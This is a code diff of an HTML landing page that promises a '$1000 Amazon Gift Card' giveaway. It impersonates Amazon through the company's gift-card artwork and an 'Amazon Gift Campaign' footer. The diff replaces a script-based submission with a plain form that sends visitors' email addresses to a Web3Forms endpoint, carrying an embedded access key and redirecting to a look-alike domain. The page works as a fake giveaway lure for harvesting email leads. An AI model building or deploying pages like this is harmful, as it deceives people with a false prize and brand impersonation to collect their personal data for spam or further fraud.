@@ -1,98 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
 <title>$1 000 Amazon Gift Card</title>
-
-<!-- ==== أسلوب مدمج سريع ==== -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 <style>
-:root{
-  --brand:#e48c00;
-  --dark:#002742;
-  --bg:#eaf6f6;
-  --radius:12px;
-}
+:root{--brand:#e48c00;--dark:#002742;--bg:#eaf6f6;--radius:12px}
 *{box-sizing:border-box;margin:0}
-body{
-  font-family:Poppins,Arial,sans-serif;
-  background:var(--bg);
-  display:flex;flex-direction:column;min-height:100vh
-}
-header{
-  background:var(--dark);color:#fff;text-align:center;
-  padding:18px 10px;font-size:22px;font-weight:600
-}
+body{font-family:Poppins,Arial,sans-serif;background:var(--bg);min-height:100vh;display:flex;flex-direction:column}
+header{background:var(--dark);color:#fff;text-align:center;padding:18px;font-size:22px;font-weight:600}
 main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
-.card{
-  max-width:480px;width:100%;background:#fff;border-radius:var(--radius);
-  padding:32px 24px;box-shadow:0 6px 20px rgb(0 0 0/10%)
-}
-.card h1{color:var(--brand);font-size:26px;margin-bottom:10px;text-align:center}
-.card p{font-size:15px;text-align:center;margin-bottom:18px;color:#333}
-.card img{width:100%;border-radius:8px;margin-bottom:22px}
+.card{max-width:480px;width:100%;background:#fff;border-radius:var(--radius);padding:32px 24px;box-shadow:0 8px 20px rgb(0 0 0/10%)}
+.card h1{color:var(--brand);font-size:28px;margin-bottom:10px;text-align:center}
+.card p{font-size:15px;color:#333;text-align:center;margin-bottom:18px}
+.card img{width:100%;border-radius:8px;margin-bottom:20px}
 form{display:flex;flex-direction:column;gap:12px}
-input[type=email]{
-  padding:14px;font-size:16px;border:1px solid #ccc;border-radius:8px
-}
-button{
-  padding:14px;font-size:17px;font-weight:600;color:#fff;background:var(--brand);
-  border:none;border-radius:8px;cursor:pointer;transition:.3s
-}
+input[type=email]{padding:14px;font-size:16px;border:1px solid #ccc;border-radius:8px}
+button{background:var(--brand);color:#fff;font-size:17px;font-weight:600;padding:14px;border:none;border-radius:8px;cursor:pointer;transition:.3s}
 button:hover{background:#c77d00}
-footer{
-  text-align:center;padding:14px 0;font-size:14px;color:#666
-}
-/* شاشة حاسب */
+footer{text-align:center;color:#666;font-size:14px;padding:12px}
 @media(min-width:1024px){
-  .card{max-width:700px;padding:40px}
-  .card h1{font-size:32px}
-  .card p{font-size:18px}
-  button{font-size:18px}
+ .card{max-width:700px;padding:40px}
+ .card h1{font-size:32px}
+ .card p{font-size:18px}
+ button{font-size:18px}
 }
 </style>
 </head>
-
 <body>
 
-<header>Limited-Time&nbsp;Giveaway</header>
+<header>Limited-Time Giveaway</header>
 
 <main>
   <div class="card">
     <h1>Win a $1000 Amazon Gift Card!</h1>
-    <p>Enter your email below and claim your chance. This offer won't last long!</p>
+    <p>Enter your email below and claim your chance.<br>This offer won't last long!</p>
+    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card">
 
-    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card"/>
-
-    <form id="leadForm">
+    <!-- نموذج Web3Forms -->
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="0dcca38e-523a-4c4a-9f0c-1488002d5763">
+      <input type="hidden" name="subject" value="New lead from Amazon Gift Card page">
+      <input type="hidden" name="redirect" value="https://amazongiftcard.7t7k.top/thankyou.html">
+      
       <input type="email" name="email" placeholder="Enter your email" required>
-      <button type="submit">Claim&nbsp;Now</button>
+      <button type="submit">Claim Now</button>
     </form>
   </div>
 </main>
 
 <footer>&copy; 2025 Amazon Gift Campaign. All rights reserved.</footer>
-
-<!-- =============  JS  ============= -->
-<script>
-document.getElementById('leadForm').addEventListener('submit',async e=>{
-  e.preventDefault();
-  const fd=new FormData(e.target);
-  fd.append('access_key','0dcca38e-523a-4c4a-9f0c-1488002d5763');   // مفتاحك
-  try{
-    const r=await fetch('https://api.web3forms.com/submit',{
-      method:'POST',
-      body:fd
-    });
-    if(r.ok){
-      window.location.href='thankyou.html';
-    }else{
-      alert('Submission failed, please try again later.');
-    }
-  }catch(err){
-    alert('Network error, please try again.');
-  }
-});
-</script>
 </body>
 </html>
